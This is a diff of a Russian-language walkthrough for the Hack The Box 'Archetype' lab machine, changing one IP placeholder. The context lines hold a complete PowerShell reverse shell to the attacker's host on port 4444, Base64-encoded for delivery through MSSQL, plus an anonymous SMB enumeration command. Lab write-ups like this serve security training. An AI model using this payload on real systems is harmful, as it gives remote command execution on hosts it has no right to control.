@@ -96,7 +96,7 @@ smbclient -L \\[ip Archetype] -N
    ```
 9. Чтобы избежать синтаксических ошибок парсера MSSQL при обработке кавычек, генерируем на атакующей машине PowerShell Oneliner скрипт и кодируем его в формат Unicode с последующим выводом в Base64.
    ```bash
-   python3 -c 'import base64; cmd = "$c = New-Object System.Net.Sockets.TCPClient(\"[ip атакующей машины]\",4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + \"PS \" + (pwd).Path + \"> \";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"; print(base64.b64encode(cmd.encode("utf-16-le")).decode())'
+   python3 -c 'import base64; cmd = "$c = New-Object System.Net.Sockets.TCPClient(\"[IP атакующей машины]\",4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + \"PS \" + (pwd).Path + \"> \";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"; print(base64.b64encode(cmd.encode("utf-16-le")).decode())'
      ```
 11. Отправляем финальную команду в консоль MSSQL:
     ```text
